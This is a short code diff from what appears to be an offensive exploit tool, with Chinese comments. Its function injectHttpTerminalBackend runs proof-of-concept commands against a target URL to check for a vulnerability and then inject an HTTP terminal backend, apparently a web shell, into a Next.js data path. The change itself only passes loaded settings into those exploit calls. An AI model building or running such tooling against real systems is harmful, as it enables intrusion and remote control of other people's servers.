@@ -1,4 +1,5 @@
 import { executePOC } from './poc-handler.js'
+import { loadSettings } from './storage-handler.js'
 
 /**
  * 生成基于 HTTP 的终端后端代码
@@ -31,7 +32,11 @@ export async function injectHttpTerminalBackend(targetUrl, apiPath = '/_next/dat
     `
     ).toString('base64')}`
 
-    const checkResult = await executePOC(targetUrl, checkCommand)
+    // 加载设置
+    const settingsResult = await loadSettings()
+    const settings = settingsResult.success ? settingsResult.settings : null
+
+    const checkResult = await executePOC(targetUrl, checkCommand, settings)
     const checkData = checkResult.digest_content
 
     // 解析检查结果
@@ -66,7 +71,7 @@ export async function injectHttpTerminalBackend(targetUrl, apiPath = '/_next/dat
     console.log('注入 HTTP 终端后端...')
     console.log('API 路径:', apiPath)
 
-    const result = await executePOC(targetUrl, command)
+    const result = await executePOC(targetUrl, command, settings)
 
     console.log('注入结果:', {
       is_vulnerable: result.is_vulnerable,
